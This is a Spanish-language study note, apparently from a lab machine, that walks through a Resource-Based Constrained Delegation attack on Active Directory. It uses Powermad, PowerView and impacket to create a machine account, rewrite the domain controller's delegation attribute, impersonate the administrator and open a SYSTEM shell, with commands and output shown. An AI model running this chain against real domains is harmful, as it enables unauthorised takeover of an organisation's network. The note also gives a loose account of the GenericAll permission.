---
title: Resource-Based Constrained Delegation Attack
author: miguel3023
date: 2022-12-26
categories: [Notes]
tags: [Active Directory]
---

Este ataque es de una escalada de privilegios, esto, en un caso específico se pudo descubrir con **sharphound** y mediante **BloodHound** y un recurso compartido a nivel de red que con "net group" pudimos ver el permiso "Generic All" aplicado a los miembros del dominio

Extraído de de [Hacktricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation#attack) 

Primero lo que tenemos que hacer es subirnos el [Powermad.ps1](https://github.com/Kevin-Robertson/Powermad) en la máquina víctima y luego el [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1). Eso si, hay que importar ambos, una vez los hayamos subido en la máquina víctima, de la siguiente manera

`Powermad`: Con esto puedes crear un "object computer" dentro del dominio

`PowerView`: Es una herramienta escrita en PowerShell diseñada para obtener información en redes de Windows Active Directory.

```
*Evil-WinRM* PS C:\Users\support\Documents> Import-Module .\Powermad.ps1
```

Luego ejecutamos el siguiente comando (Lo que dice "SERVICEA" lo puedes cambiar por lo que quieras y la parte de los números, que es una constraseña, también, pero simplemente recuerda esto para luego). Esto es para crear una cuenta de máquina ó "MachineAccount" proporcionandole una contraseña y un nombre en específico

```
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Luego puedes verificar que lo anterior se ejecutó correctamente de la siguiente forma

```
Get-DomainComputer SERVICEA
```

Una vez hecho esto, hacemos el siguiente comando para almacenar en una variable el ObjectSid

```
$ComputerSid = Get-DomainComputer SERVICEA -Properties objectsid | Select -Expand objectsid
```

Y lo comprobamos haciendo

```
echo $ComputerSid
```

Luego ejecutamos esto que lo que hace es crear un nuevo objeto "RawSecurityDescriptor" que contiene la información de seguridad especificada en la cadena de caracteres y lo asigna a la variable $SD. Y también asigna los permisos ó el control total al propietario del objeto, que en este caso es con el usuario al cual tienes acceso en la máquina víctima

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
```

Luego el siguiente que lo que hace es crear un nuevo array de bytes con un tamaño igual al tamaño de la información de seguridad contenida en el objeto $SD y lo asigna a la variable $SDBytes

```
$SDBytes = New-Object byte[] ($SD.BinaryLength)
```

Luego esta que lo que hace es  obtener la representación binaria de la información de seguridad contenida en el objeto $SD y la escribe en el array de bytes $SDBytes

```
$SD.GetBinaryForm($SDBytes, 0)
```

Luego (en este caso se pone "dc" porque así se llama la máquina. En hacktricks trae una variable, pero esa variable nunca la hemos definido, por ende ponemos "dc"). 

Esto lo que hace es obtener información sobre un equipo de dominio específico, establece el valor del atributo "msds-allowedtoactonbehalfofotheridentity" del equipo de dominio al valor del array de bytes $SDBytes y actualiza el equipo de dominio con los cambios

```
Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDByte
s}
```

Ya para comprobar todo lo anteriormente hecho hacemos, luego te debería de mostrar algo como lo siguiente

```
Get-DomainComputer dc -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}

```

Ya por último con la herramienta [impacket-getST](https://github.com/tothi/rbcd-attack#getting-the-impersonated-service-ticket) podemos obtener el TGT del usuario administrator (En SERVICEA ponemos el nombre del objeto que creamos anteriormente y le proporcionamos la contraseña que hemos creado)

```
❯ impacket-getST -spn cifs/dc.dominio.com -impersonate administrator -dc-ip <ip> dominio.htb/SERVICEA$:123456

[*] Getting TGT for user
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```

El TGT se guardó en este caso en "administrator.ccache" y lo que tenemos que hacer es igualar una variable de entorno en donde nos guardó el TGT

```
❯ export KRB5CCNAME=administrator.ccache
```
Y ya por último puedes conectarte con "psexec" como administrator sin proporcionar credenciales

```
❯ impacket-psexec -k dc.support.htb

*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file tDagzSkX.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service lxWO on dc.support.htb.....
[*] Starting service lxWO.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>

```

`Nota`: Todo esto también se puede hacer con **Rubeus**

## Permiso Generic All

"Generic All" es un permiso en entornos de directorio activo que le da a un usuario o grupo acceso completo a todos los objetos en el
 directorio. Esto incluye la capacidad de leer, escribir y ejecutar todos los archivos y carpetas en el directorio, así como modifica
r los atributos de los objetos y crear y eliminar objetos.

En general, "Generic All" se utiliza para otorgar acceso completo a un usuario o grupo a todos los objetos en un directorio, lo que p
uede ser útil en casos en los que se desea dar acceso total a un usuario o grupo para realizar tareas de administración o mantenimien
to en el directorio. Sin embargo, también es importante tener en cuenta que otorgar permisos "Generic All" a un usuario o grupo puede
 ser un riesgo de seguridad si no se hace de manera adecuada, ya que puede dar a ese usuario o grupo un control total sobre los objet
os en el directorio. Por lo tanto, es importante utilizar este permiso de manera cuidadosa y asegurarse de que solo se conceda a usua
rios o grupos de confianza.
